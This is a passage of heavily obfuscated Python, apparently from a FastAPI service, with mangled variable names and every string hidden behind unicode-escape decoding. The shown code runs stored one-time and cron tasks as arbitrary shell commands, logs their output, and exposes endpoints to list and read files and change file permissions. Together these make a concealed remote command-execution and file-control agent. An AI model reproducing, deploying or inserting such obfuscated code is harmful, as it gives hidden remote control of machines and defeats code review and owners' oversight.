            O0_var_1993 = cls._parse_task_meta(O0_var_1992)
            O0_var_1994 = cls._strip_task_meta(O0_var_1992).strip()
            O0_var_1995 = -1
            if O0_var_1993:
                for O0_var_1996, O0_var_1997 in enumerate(O0_var_1988):
                    if O0_var_1996 not in O0_var_1990 and O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')] and (O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][0] == O0_var_1993[0]):
                        O0_var_1995 = O0_var_1996
                        break
            if O0_var_1995 < 0:
                for O0_var_1996, O0_var_1997 in enumerate(O0_var_1988):
                    if O0_var_1996 not in O0_var_1990 and O0_var_1997[codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape')] == O0_var_1994 and (not O0_var_1993 or not O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')]):
                        O0_var_1995 = O0_var_1996
                        break
            if O0_var_1995 < 0:
                O0_var_1991.append(cls._with_task_meta(O0_var_1994, str(O0_var_1987), O0_var_1987))
                continue
            O0_var_1997 = O0_var_1988[O0_var_1995]
            O0_var_1990.add(O0_var_1995)
            if O0_var_1997[codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape')] == O0_var_1994:
                O0_var_1998 = O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')]
                if O0_var_1998:
                    O0_var_1991.append(cls._with_task_meta(O0_var_1997[codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape')], O0_var_1998[0], O0_var_1998[1]))
                else:
                    O0_var_1991.append(cls._with_task_meta(O0_var_1997[codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape')], O0_var_1993[0] if O0_var_1993 else str(O0_var_1987), O0_var_1993[1] if O0_var_1993 and O0_var_1993[1] else O0_var_1987))
                continue
            O0_var_1999 = O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][0] if O0_var_1997[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')] else O0_var_1993[0] if O0_var_1993 else str(O0_var_1987)
            O0_var_1991.append(cls._with_task_meta(O0_var_1994, O0_var_1999, O0_var_1987))
        return O0_var_1991

    @classmethod
    def _normalize_cron_tasks(cls, incoming: Dict[str, str], stored: Dict[str, str]) -> Dict[str, str]:
        O0_var_2000 = int(time.time() * 1000)
        O0_var_2001 = [{codecs.decode('\\u0065\\u0078\\u0070\\u0072', 'unicode_escape'): O0_var_2002, codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape'): O0_var_2003, codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'): cls._parse_task_meta(O0_var_2003), codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape'): cls._strip_task_meta(O0_var_2003).strip()} for O0_var_2002, O0_var_2003 in (stored or {}).items()]
        O0_var_2004 = set()
        O0_var_2005: Dict[str, str] = {}
        for O0_var_2006, O0_var_2007 in (incoming or {}).items():
            O0_var_2006 = str(O0_var_2006)
            O0_var_2007 = str(O0_var_2007 or codecs.decode('', 'unicode_escape'))
            O0_var_2008 = cls._parse_task_meta(O0_var_2007)
            O0_var_2009 = cls._strip_task_meta(O0_var_2007).strip()
            O0_var_2010 = -1
            if O0_var_2008:
                for O0_var_2011, O0_var_2012 in enumerate(O0_var_2001):
                    if O0_var_2011 not in O0_var_2004 and O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')] and (O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][0] == O0_var_2008[0]):
                        O0_var_2010 = O0_var_2011
                        break
            if O0_var_2010 < 0:
                for O0_var_2011, O0_var_2012 in enumerate(O0_var_2001):
                    if O0_var_2011 not in O0_var_2004 and O0_var_2012[codecs.decode('\\u0065\\u0078\\u0070\\u0072', 'unicode_escape')] == O0_var_2006 and (O0_var_2012[codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape')] == O0_var_2009) and (not O0_var_2008 or not O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')]):
                        O0_var_2010 = O0_var_2011
                        break
            if O0_var_2010 < 0:
                O0_var_2005[O0_var_2006] = cls._with_task_meta(O0_var_2009, str(O0_var_2000), O0_var_2000)
                continue
            O0_var_2012 = O0_var_2001[O0_var_2010]
            O0_var_2004.add(O0_var_2010)
            if O0_var_2012[codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape')] == O0_var_2009 and O0_var_2012[codecs.decode('\\u0065\\u0078\\u0070\\u0072', 'unicode_escape')] == O0_var_2006:
                O0_var_2013 = O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')]
                if O0_var_2013:
                    O0_var_2005[O0_var_2006] = cls._with_task_meta(O0_var_2012[codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape')], O0_var_2013[0], O0_var_2013[1])
                else:
                    O0_var_2005[O0_var_2006] = cls._with_task_meta(O0_var_2012[codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape')], O0_var_2008[0] if O0_var_2008 else str(O0_var_2000), O0_var_2008[1] if O0_var_2008 and O0_var_2008[1] else O0_var_2000)
                continue
            O0_var_2014 = O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')][0] if O0_var_2012[codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape')] else O0_var_2008[0] if O0_var_2008 else str(O0_var_2000)
            O0_var_2005[O0_var_2006] = cls._with_task_meta(O0_var_2009, O0_var_2014, O0_var_2000)
        return O0_var_2005

    def set_onetime_tasks(self, O0_var_2015: List[str]) -> dict:
        Config.onetasks = self._normalize_onetime_tasks(O0_var_2015, Config.onetasks) if O0_var_2015 else []
        O0_var_2016 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}
        O0_var_2016[codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape')] = self.store.save(Config.onetasks, Config.crontasks)
        return O0_var_2016

    def get_onetime_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def run_onetime_tasks(self) -> List[dict]:
        if not Config.InitTask or not Config.onetasks:
            return []
        O0_var_2017 = []
        O0_var_2018 = Config.onetasks.copy()
        for O0_var_2019, O0_var_2020 in enumerate(O0_var_2018):
            O0_var_2021 = datetime.utcnow()
            try:
                if Config.DEBUG:
                    Logger.debug(codecs.decode('\\U0001f680\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u002d', 'unicode_escape') + str(O0_var_2019 + 1) + codecs.decode('\\u005d\\u0020\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0069\\u006e\\u0067\\u003a\\u0020', 'unicode_escape') + str(O0_var_2020[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                O0_var_2022 = subprocess.run(O0_var_2020, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, timeout=self.timeout, text=True, errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                O0_var_2023 = O0_var_2022.stdout[:2000]
                O0_var_2024 = O0_var_2022.returncode
                O0_var_2025 = self._format_log_entry(O0_var_2020, O0_var_2023, O0_var_2024, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_2025, self.max_log_size)
                O0_var_2017.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_2019, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_2020[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_2024, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_2023[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
            except subprocess.TimeoutExpired as e:
                O0_var_2023 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u0020', 'unicode_escape') + str(e.output[:500] if e.output else '')
                O0_var_2024 = 124
                O0_var_2025 = self._format_log_entry(O0_var_2020, O0_var_2023, O0_var_2024, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_2025, self.max_log_size)
                O0_var_2017.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_2019, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_2020[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_2024, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_2023[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')})
            except Exception as e:
                O0_var_2023 = codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_2024 = -1
                O0_var_2025 = self._format_log_entry(O0_var_2020, O0_var_2023, O0_var_2024, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_2025, self.max_log_size)
                O0_var_2017.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_2019, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_2020[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_2024, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_2023, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')})
        Config.InitTask = False
        if Config.DEBUG:
            Logger.debug(codecs.decode('\\u2705\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u005d\\u0020\\u0043\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064\\u0020', 'unicode_escape') + str(len(O0_var_2017)) + codecs.decode('\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u002c\\u0020\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073\\u005f\\u006c\\u006f\\u0067', 'unicode_escape'))
        return O0_var_2017

    async def _check_and_run_cron(self):
        if not Config.crontasks:
            return
        O0_var_2026 = datetime.now()
        for O0_var_2027, O0_var_2028 in Config.crontasks.items():
            try:
                O0_var_2029 = croniter(O0_var_2027, O0_var_2026)
                O0_var_2030 = O0_var_2029.get_prev(datetime)
                O0_var_2031 = (O0_var_2026 - O0_var_2030).total_seconds()
                if 0 <= O0_var_2031 <= self.check_interval + 5:
                    O0_var_2032 = O0_var_2030.strftime(codecs.decode('\\u0025\\u0059\\u0025\\u006d\\u0025\\u0064\\u0025\\u0048\\u0025\\u004d', 'unicode_escape'))
                    O0_var_2033 = str(O0_var_2027) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_2028) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_2032)
                    O0_var_2034 = hashlib.md5(O0_var_2033.encode()).hexdigest()[:10]
                    if O0_var_2034 in self._executed_crons:
                        continue
                    if Config.DEBUG:
                        Logger.info(codecs.decode('\\u23f0\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0054\\u0072\\u0069\\u0067\\u0067\\u0065\\u0072\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_2027) + codecs.decode('\\u0020\\u2192\\u0020', 'unicode_escape') + str(O0_var_2028[:50]) + codecs.decode('\\u002e\\u002e\\u002e\\u0020\\u0028\\u004c\\u0061\\u0067\\u003a\\u0020', 'unicode_escape') + format(O0_var_2031, codecs.decode('\\u002e\\u0032\\u0066', 'unicode_escape')) + codecs.decode('\\u0073\\u0029', 'unicode_escape'))
                    O0_var_2035 = await asyncio.create_subprocess_shell(O0_var_2028, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, stdin=asyncio.subprocess.DEVNULL)
                    try:
                        O0_var_2036, O0_var_2037 = await asyncio.wait_for(O0_var_2035.communicate(), timeout=self.timeout)
                        O0_var_2038 = O0_var_2036.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:2000]
                        O0_var_2039 = O0_var_2035.returncode
                    except asyncio.TimeoutError:
                        try:
                            O0_var_2035.kill()
                        except:
                            pass
                        O0_var_2038 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d', 'unicode_escape')
                        O0_var_2039 = 124
                    except Exception as inner_e:
                        O0_var_2038 = codecs.decode('\\u005b\\u0052\\u0055\\u004e\\u0054\\u0049\\u004d\\u0045\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(inner_e))
                        O0_var_2039 = -1
                    O0_var_2040 = self._format_log_entry(O0_var_2028, O0_var_2038, O0_var_2039, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_2027)
                    Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_2040, self.max_log_size)
                    self._executed_crons.add(O0_var_2034)
                    asyncio.get_event_loop().call_later(120, self._executed_crons.discard, O0_var_2034)
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0053\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u0072\\u0020\\u0045\\u0072\\u0072\\u006f\\u0072\\u0020\\u0066\\u006f\\u0072\\u0020\\u0027', 'unicode_escape') + str(O0_var_2027) + codecs.decode('\\u0027\\u003a\\u0020', 'unicode_escape') + str(e))
                O0_var_2038 = codecs.decode('\\u005b\\u0053\\u0043\\u0048\\u0045\\u0044\\u0055\\u004c\\u0045\\u0052\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_2040 = self._format_log_entry(O0_var_2028, O0_var_2038, -1, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_2027)
                Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_2040, self.max_log_size)

    def get_onetime_log(self, limit: int=None) -> list:
        O0_var_2041 = list(Config.onetimetasks_log)
        if limit and limit > 0:
            return O0_var_2041[-limit:]
        return O0_var_2041

    def get_cron_log(self, limit: int=None) -> list:
        O0_var_2042 = list(Config.crontasks_log)
        if limit and limit > 0:
            return O0_var_2042[-limit:]
        return O0_var_2042

    def clear_logs(self, O0_var_2043: str=codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')):
        if O0_var_2043 in [codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.onetimetasks_log.clear()
        if O0_var_2043 in [codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.crontasks_log.clear()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006c\\u0065\\u0061\\u0072\\u0065\\u0064', 'unicode_escape'): O0_var_2043}

    def set_cron_tasks(self, O0_var_2044: Dict[str, str]) -> dict:
        O0_var_2045 = []
        for O0_var_2046 in O0_var_2044.keys():
            try:
                croniter(O0_var_2046, datetime.now())
            except Exception:
                O0_var_2045.append(O0_var_2046)
        if O0_var_2045:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u0072\\u006f\\u006e\\u0020\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_2045), codecs.decode('\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_2044) - len(O0_var_2045)}
        Config.crontasks = self._normalize_cron_tasks(O0_var_2044, Config.crontasks) if O0_var_2044 else {}
        if Config.crontasks and (not Config.cronloop):
            self.start_cron_loop()
        elif not Config.crontasks and Config.cronloop:
            self.stop_cron_loop()
        O0_var_2047 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}
        O0_var_2047[codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape')] = self.store.save(Config.onetasks, Config.crontasks)
        return O0_var_2047

    def get_cron_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def start_cron_loop(self):
        if Config.cronloop and self._running:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0072\\u0075\\u006e\\u006e\\u0069\\u006e\\u0067', 'unicode_escape')}
        Config.cronloop = True
        self._running = True
        self._executed_crons.clear()
        try:
            O0_var_2048 = asyncio.get_event_loop()
            self._cron_task = O0_var_2048.create_task(self._cron_loop_worker())
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        except RuntimeError:
            import threading
            O0_var_2049 = threading.Thread(target=self._run_cron_sync, daemon=True)
            O0_var_2049.start()
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064', 'unicode_escape')}

    def stop_cron_loop(self):
        Config.cronloop = False
        self._running = False
        if self._cron_task:
            self._cron_task.cancel()
            self._cron_task = None
        if Config.DEBUG:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')}

    async def _cron_loop_worker(self):
        while self._running and Config.cronloop:
            try:
                await self._check_and_run_cron()
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(e))
            await asyncio.sleep(self.check_interval)

    def _run_cron_sync(self):
        import time
        while self._running and Config.cronloop:
            try:
                asyncio.run(self._check_and_run_cron())
            except:
                pass
            time.sleep(self.check_interval)

    @staticmethod
    def _append_task_log(log_list: deque, entry: dict, max_size: int=None):
        if max_size is None:
            max_size = Config.MAX_TASK_LOG_SIZE
        if not isinstance(log_list, deque):
            log_list = deque(log_list, maxlen=max_size)
        log_list.append(entry)
        return log_list

    @staticmethod
    def _format_log_entry(cmd: str, output: str, exitcode: int, task_type: str, cron_expr: str=None) -> dict:
        return {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat() + codecs.decode('\\u005a', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): cmd, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): output, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exitcode, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): task_type, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): cron_expr, codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): str(datetime.utcnow().isoformat()) + codecs.decode('\\u005a\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020', 'unicode_escape') + str(cmd) + codecs.decode('\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065\\u003d', 'unicode_escape') + str(exitcode) + codecs.decode('\\u000a', 'unicode_escape') + str(output.strip())}

    def get_status(self) -> dict:
        return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): {codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): Config.InitTask and len(Config.onetasks) > 0, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks)}, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): {codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065', 'unicode_escape'): Config.cronloop, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0063\\u0068\\u0065\\u0063\\u006b\\u005f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c', 'unicode_escape'): self.check_interval}, codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u006e\\u0063\\u0065', 'unicode_escape'): {codecs.decode('\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'): self.store.enabled, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065\\u005f\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self.store.path, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): self.store.last_saved_at}}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), response_model=FileListResponse)
async def O0_fn_80(request: Request, body: FileListRequest=Body(...)):
    O0_var_2050 = request.app.state.file_manager
    O0_var_2051 = O0_var_2050.list_files(base_path=body.path, recursive=body.recursive)
    return O0_var_2051

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthorityQueryResponse, response_model_exclude_none=True)
async def O0_fn_81(request: Request, body: AuthorityQueryRequest=Body(...)):
    if not body.paths:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): []})
    O0_var_2052 = request.app.state.file_manager
    O0_var_2053 = O0_var_2052.get_authority(body.paths)
    return O0_var_2053

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthoritySetResponse)
async def O0_fn_82(request: Request, body: AuthoritySetRequest=Body(...)):
    O0_var_2054 = body.permissions
    O0_var_2055 = body.recursive
    if not O0_var_2054:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_2056 = request.app.state.file_manager
    O0_var_2057 = O0_var_2056.set_authority(O0_var_2054, O0_var_2055)
    return O0_var_2057

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0061\\u0074', 'unicode_escape'), response_model=FileCatResponse)
async def O0_fn_83(request: Request, body: FileCatRequest=Body(...)):
    if not body.path:
